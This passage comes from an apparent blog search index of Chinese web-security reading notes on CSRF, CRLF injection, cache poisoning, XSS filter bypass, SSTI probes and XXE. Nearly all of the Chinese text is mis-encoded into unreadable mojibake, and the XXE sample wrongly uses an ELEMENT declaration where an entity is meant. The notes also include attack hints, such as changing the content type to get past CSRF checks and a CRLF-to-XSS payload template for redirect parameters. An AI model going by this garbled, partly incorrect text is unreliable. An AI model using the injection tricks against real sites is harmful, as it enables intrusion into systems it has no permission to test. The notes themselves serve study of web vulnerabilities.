‡ç­¾ï¼Œdisplay&#x3D;â€noneâ€å¯ä»¥éšè—å“åº”å†…å®¹</p><ul><li>åº”è¯¥é‡ç‚¹å…³æ³¨åœ¨æœåŠ¡å™¨ç«¯æ‰§è¡Œæ“ä½œçš„HTTPè¯·æ±‚.æœ‰æ—¶å€™ä¸€äº›APIæ¥å£ä¹Ÿä¼šå­˜åœ¨CSRFã€‚</li><li>å¦‚æœç½‘ç«™æ­£åœ¨ä½¿ç”¨POSTè¯·æ±‚å‘é€CSRFä»¤ç‰Œï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•ä¿®æ”¹æˆ–å°†å…¶åˆ é™¤ï¼Œä»¥éªŒè¯ä»¤ç‰Œæ˜¯å¦å­˜åœ¨</li></ul><p>å¸¸è§é˜²å¾¡æ‰‹æ®µï¼š</p><ul><li>ç½‘ç«™è¦æ±‚ä»¥å†…å®¹ç±»å‹ï¼ˆcontent-typeï¼‰ä¸ºapplication&#x2F;jsonï¼Œå¸¦ç€ä¸€ä¸ªCSRF tokenè¿›è¡Œæäº¤ï¼Œç”¨æ¥éªŒè¯è¯·æ±‚çš„å‘èµ·è€…ã€‚å½“æµè§ˆå™¨å‘é€application&#x2F;jsonè¯·æ±‚æ—¶ï¼Œä¼šå‘é€ä¸€ä¸ªOPTIONS HTTPè¯·æ±‚ï¼Œè¿™ä¸ªè¯·æ±‚ä¼šè¿”å›æ”¯æŒçš„HTTPè¯·æ±‚ç±»å‹å’Œä¿¡ä»»çš„æºã€‚æœ‰äº›æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¿®æ”¹content-typeç»•è¿‡è¿™äº›æªæ–½ã€‚</li><li>æ‰©æºèµ„æºå…±äº«ï¼ˆCORSï¼‰å®šä¹‰äº†ç½‘ç«™ä»€ä¹ˆæ—¶å€™å’Œå¦‚ä½•äº’ç›¸è¯»å–å“åº”ä¿¡æ¯ã€‚æœ‰äº›æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥å°†content-typeä¿®æ”¹ä¸ºapplication&#x2F;x-www-form-urlencodedï¼Œmultipart&#x2F;form-dataæˆ–textã€‚plainæ¥ç»•è¿‡ï¼Œè¿™æ ·å°±ä¸ä¼šå‘èµ·OPTIONS HTTPè¯·æ±‚ã€‚</li><li>å°†tokenå†™åœ¨æŸä¸€ä¸ªhttpä¸­ï¼ˆGETï¼ŒPOSTéƒ½æœ‰å¯èƒ½ï¼‰ã€‚</li></ul><h1 id="CRLFæ³¨å…¥ï¼ˆå›è½¦æ¢è¡Œæ³¨å…¥ï¼‰"><a href="#CRLFæ³¨å…¥ï¼ˆå›è½¦æ¢è¡Œæ³¨å…¥ï¼‰" class="headerlink" title="CRLFæ³¨å…¥ï¼ˆå›è½¦æ¢è¡Œæ³¨å…¥ï¼‰"></a>CRLFæ³¨å…¥ï¼ˆå›è½¦æ¢è¡Œæ³¨å…¥ï¼‰</h1><p>ç®€è¿°ï¼šæœåŠ¡å™¨å’Œæµè§ˆå™¨éƒ½æ˜¯é€šè¿‡CRLFå­—ç¬¦æ¥è¯†åˆ«HTTPæ¶ˆæ¯ä¸­çš„ä¸åŒéƒ¨åˆ†çš„,æˆ‘ä»¬å¯ä»¥åœ¨httpå¤´ä¸­åŠ å…¥å›è½¦æ¢è¡Œç¬¦ \n\rï¼Œå…¶ç¼–ç å½¢å¼ä¸º%0d%0aï¼Œä»è€Œä¿®æ”¹httpå¤´çš„æ¶ˆæ¯ã€‚è¿›ä¸€æ­¥å¯ä»¥é€ æˆHTTPå¤¹å¸¦æ”»å‡»ï¼ŒHTTPå“åº”æ”»å‡»å’ŒXSSæ”»å‡»ï¼Œä¼šè¯å›ºå®šï¼Œç¼“å­˜æŠ•æ¯’ç­‰ã€‚</p><p>æ¼æ´æŒ–æ˜ï¼š</p><ul><li>æ³¨å…¥ç‚¹ä¸»è¦æ˜¯é‡å®šå‘æˆ–è€…è·³è½¬çš„åœ°æ–¹ã€‚è¦è§‚å¯Ÿè¾“å‡ºæ˜¯å¦å†è¿”å›å¤´ä¸­ï¼ŒæŸ¥çœ‹è¾“å…¥ï¼Œå¯èƒ½æ˜¯åœ¨URLå€¼å’Œå‚æ•°ï¼Œcookieä¸­ã€‚</li><li>å¸¸è§çš„ä¸¤ç§æƒ…å†µæ˜¯ä½¿ç”¨è¾“å…¥å‚æ•°set-cookieå’Œ302è·³è½¬locationå¤„ã€‚CRLFä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥åŠ å…¥æ–°çš„å‚æ•°ï¼Œæˆ–è¿›è¡ŒXSSæ³¨å…¥ã€‚æ¯”å¦‚æŸä¸€ä¸ªé“¾æ¥ï¼šxxx.com?url&#x3D;<a href="http://www.baidu.com,ç„¶åè¿™ä¸ªwww.baidu.comåˆå‡ºç°åœ¨é¡µé¢å½“ä¸­,æ­¤æ—¶æˆ‘ä»¬å¯ä»¥å°†è¿™ä¸ªé‡å®šå‘æ¼æ´è¿›è¡Œè¿›ä¸€æ­¥çš„å‡çº§,æ”¹ä¸ºxxx.com/?url=%0D%0A">www.baidu.comï¼Œç„¶åè¿™ä¸ªwww.baidu.comåˆå‡ºç°åœ¨é¡µé¢å½“ä¸­ï¼Œæ­¤æ—¶æˆ‘ä»¬å¯ä»¥å°†è¿™ä¸ªé‡å®šå‘æ¼æ´è¿›è¡Œè¿›ä¸€æ­¥çš„å‡çº§ï¼Œæ”¹ä¸ºxxx.com?url=%0d%0a</a><xss payload>ï¼Œä»è€Œæ³¨å…¥xssã€‚</li></ul><p>å¸¸è§é˜²å¾¡æ‰‹æ®µï¼š</p><ul><li>è¿‡æ»¤CRLFå­—ç¬¦</li></ul><h1 id="ç¼“å­˜æŠ•æ¯’"><a href="#ç¼“å­˜æŠ•æ¯’" class="headerlink" title="ç¼“å­˜æŠ•æ¯’"></a>ç¼“å­˜æŠ•æ¯’</h1><p>ç®€è¿°ï¼šæœåŠ¡å™¨ä¸ºäº†èŠ‚çœèµ„æºï¼Œå½“å¤šä¸ªç”¨æˆ·è¯·æ±‚åŒä¸€èµ„æºæ—¶ï¼ŒæœåŠ¡ç«¯ä¼šè¿”å›é¢„å…ˆå­˜å¥½çš„èµ„æºã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¿®æ”¹è¿™ä¸ªç¼“å­˜é€ æˆç¼“å­˜æŠ•æ¯’</p><h1 id="XXS"><a href="#XXS" class="headerlink" title="XXS"></a>XXS</h1><p>æ¼æ´æŒ–æ˜ï¼š</p><ul><li>æœ‰æ—¶å€™æ³¨å…¥ä¸€ä¸ªxsså¹¶ä¸ä¼šé©¬ä¸Šå‘ç”Ÿåé¦ˆï¼Œæ¯”å¦‚åœ¨ç”¨æˆ·åæ³¨å…¥xss payloadï¼Œä½†åœ¨ä¸ªäººä¸»é¡µä¸Šå¹¶æ²¡æœ‰åé¦ˆï¼Œä½†åœ¨é‚®ç®±åŠŸèƒ½å´èƒ½å¤Ÿå®ç°ã€‚æ‰€ä»¥è¦å…³æ³¨å¤šä¸ªåœ°æ–¹ï¼Œçœ‹xssæ˜¯å¦åœ¨æŸä¸ªä¸æ˜¾è‘—çš„åœ°æ–¹å®ç°äº†ã€‚</li><li>æœ‰æ—¶å€™xssä¼šè¢«jsä»£ç è¿‡æ»¤ï¼Œç¼–ç ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡é‡å†™æ­¤jsä»£ç ç»•è¿‡</li><li>æœ‰äº›ç½‘ç«™ä½¿ç”¨ä¿®æ”¹xssï¼ˆç§»é™¤å­—ç¬¦ï¼Œå±æ€§ç­‰ï¼‰è¿›è¡Œè¾“å…¥è¿‡æ»¤ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åˆ†æå®ƒçš„æœºåˆ¶ï¼Œåˆ©ç”¨è¿™ä¸ªä¿®æ”¹æœºåˆ¶ç»•è¿‡</li><li>ç½‘ç«™å¯èƒ½åªå¯¹è¾“å…¥è¿›è¡Œè¿‡æ»¤ï¼Œè€Œé¡µé¢å‘ˆç°æ²¡æœ‰è¿‡æ»¤ã€‚ï¼ˆåˆ©ç”¨æ¡ä»¶è¾ƒè‹›åˆ»ï¼‰</li><li>å¤šå…³æ³¨èƒ½åé¦ˆåˆ°é¡µé¢çš„è¾“å…¥</li></ul><h1 id="SSTIæ¨¡æ¿æ³¨å…¥"><a href="#SSTIæ¨¡æ¿æ³¨å…¥" class="headerlink" title="SSTIæ¨¡æ¿æ³¨å…¥"></a>SSTIæ¨¡æ¿æ³¨å…¥</h1><p>æ¼æ´æŒ–æ˜ï¼šå¸¸ç”¨49ï¼Œ&lt;%&#x3D;xxx%&gt;è¿›è¡Œæµ‹è¯•</p><ul><li>åœ¨å¯»æ‰¾æ¼æ´å‰ï¼Œæœ€å¥½å¯¹ç½‘ç«™è¿›è¡Œä¿¡æ¯æ”¶é›†ï¼Œç¡®è®¤ä¸€ä¸‹ä½¿ç”¨çš„ç›¸å…³æŠ€æœ¯ï¼ˆæ¯”å¦‚ç½‘ç«™çš„æ¡†æ¶ï¼Œå‰ç«¯å‘ˆç°çš„å¼•æ“ï¼ŒCMSç­‰ï¼‰</li></ul><h1 id="XXE-å¤–éƒ¨å®ä½“æ³¨å…¥"><a href="#XXE-å¤–éƒ¨å®ä½“æ³¨å…¥" class="headerlink" title="XXE(å¤–éƒ¨å®ä½“æ³¨å…¥)"></a>XXE(å¤–éƒ¨å®ä½“æ³¨å…¥)</h1><p>ç®€è¿°ï¼š</p><p>XML å’Œ HTML ä¸ºä¸åŒçš„ç›®çš„è€Œè®¾è®¡ï¼š</p><ul><li>XML è¢«è®¾è®¡ç”¨æ¥ä¼ è¾“å’Œå­˜å‚¨æ•°æ®ï¼Œå…¶ç„¦ç‚¹æ˜¯æ•°æ®çš„å†…å®¹ã€‚</li><li>HTML è¢«è®¾è®¡ç”¨æ¥æ˜¾ç¤ºæ•°æ®ï¼Œå…¶ç„¦ç‚¹æ˜¯æ•°æ®çš„å¤–è§‚</li></ul><p>åŸºæœ¬ç»„æˆï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;ISO-8859-1&quot;</span><span class="meta">?&gt;</span> <span class="comment">#å£°æ˜å¤´</span></span><br><span class="line">&lt;note&gt; <span class="comment">#å†…å®¹ï¼Œæ ‡ç­¾åæ˜¯å¯ä»¥è‡ªå®šä¹‰çš„</span></span><br><span class="line">&lt;to&gt;Tove&lt;/to&gt;</span><br><span class="line">&lt;<span class="keyword">from</span>&gt;Jani&lt;/<span class="keyword">from</span>&gt;</span><br><span class="line">&lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">&lt;body fun=<span class="string">&quot;1&quot;</span>&gt;Don<span class="string">&#x27;t forget me this weekend!&lt;/body&gt; #å¸¦äº†ä¸€ä¸ªfunå±æ€§</span></span><br><span class="line"><span class="string">&lt;website&gt;&amp;url;&lt;/website&gt;</span></span><br><span class="line"><span class="string">&lt;/note&gt;</span></span><br></pre></td></tr></table></figure><p>XMLå®ä½“ï¼šç›¸å½“äºå®šä¹‰ä¸€ä¸ªå˜é‡ï¼Œé¿å…å¤šæ¬¡è°ƒç”¨æ—¶é‡å¤ç¼–å†™ã€‚å®ä½“åä¸ºä»¥&amp;å¼€å¤´ï¼Œä»¥;ç»“å°¾ã€‚å¦‚æœå®ä½“éœ€è¦è¢«è®¡ç®—ï¼Œé‚£ä¹ˆå°†&amp;æ›¿æ¢ä¸º%ï¼Œå³ä¸º%xxx;</p><p>DTD :å®šä¹‰æ–‡æ¡£ç»“æ„ï¼Œæ”¯æŒå¤–éƒ¨DTDå’Œå†…éƒ¨DTDï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">&quot;1.0&quot;</span><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE note [ </span><br><span class="line">&lt;!ELEMENT <span class="title function_ invoke__">note</span> (to,<span class="keyword">from</span>,heading,body)&gt;</span><br><span class="line">&lt;!ELEMENT <span class="title function_ invoke__">to</span> (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT <span class="keyword">from</span> (<span class="comment">#PCDATA)&gt;</span></span><br><span class="line">&lt;!ELEMENT <span class="title function_ invoke__">heading</span> (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT <span class="title function_ invoke__">body</span> (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT url SYSTEM <span class="string">&quot;website.txt&quot;</span>&gt;</span><br><span class="line">]&gt;</span><br><span class="line">...æ­¤å¤„ä¸ºä¸Šä¸€ä¸ªä»£ç å—çš„ä»£ç </span><br><span class="line"><span class="comment">###</span></span><br><span class="line">&lt;!DOCTYPE note []&gt;å®šä¹‰æ­¤æ–‡æ¡£æ˜¯ note ç±»å‹çš„æ–‡æ¡£ã€‚</span><br><span class="line">&lt;!ELEMENT note&gt;å®šä¹‰ note å…ƒç´ æœ‰å››ä¸ªå…ƒç´ ï¼š<span class="string">&quot;toã€fromã€heading,ã€body&quot;</span></span><br><span class="line">&lt;!ELEMENT to&gt; å®šä¹‰ to å…ƒç´ ä¸º <span class="string">&quot;#PCDATA&quot;</span> ç±»å‹ï¼ˆä¸‹é¢çš„åŒç†ï¼‰</span><br><span class="line">psï¼š</span><br><span class="line"><span class="comment">#PCDATA è¡¨ç¤ºå¯è¿›è¡ŒHTMLè§£æçš„å­—ç¬¦æ•°æ®ï¼Œä¸è¿‡ï¼Œè¢«è§£æçš„å­—ç¬¦æ•°æ®ä¸åº”å½“åŒ…å«ä»»ä½• &amp;ã€&lt; æˆ–è€… &gt; å­—ç¬¦ï¼›éœ€è¦ä½¿ç”¨ &amp;amp;ã€&amp;lt; ä»¥åŠ &amp;gt; å®ä½“æ¥åˆ†åˆ«æ›¿æ¢å®ƒä»¬ã€‚</span></span><br><span class="line"><span class="comment">#CDdata è¡¨ç¤ºä¸ä¼šè¢«è§£æå™¨è§£æçš„æ–‡æœ¬</span></span><br><span class="line">ANY å®šä¹‰æ ‡ç­¾åŒ…å«ä»»ä½•å¯è§£æçš„æ•°æ®</span><br><span class="line"></span><br><span class="line">&lt;!ELEMENT url SYSTEM <span class="string">&quot;website.txt&quot;</span>&gt; ä½¿ç”¨SYSTEMå±æ€§å‘Šè¯‰è§£æå™¨ä½¿ç”¨urlå ä½ç¬¦è·å–website.txtæ–‡ä»¶çš„å†…å®¹</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ¼æ´æŒ–æ˜ï¼š</p><ul><li>æ³¨æ„å…·æœ‰xmlï¼Œå¯ä»¥ä¸Šä¼ xmlçš„åœ°æ–¹</li></ul>]]></content>
      
      
      <categories>
          
          <category> ç½‘ç»œå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è¯»ä¹¦ç¬”è®° </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
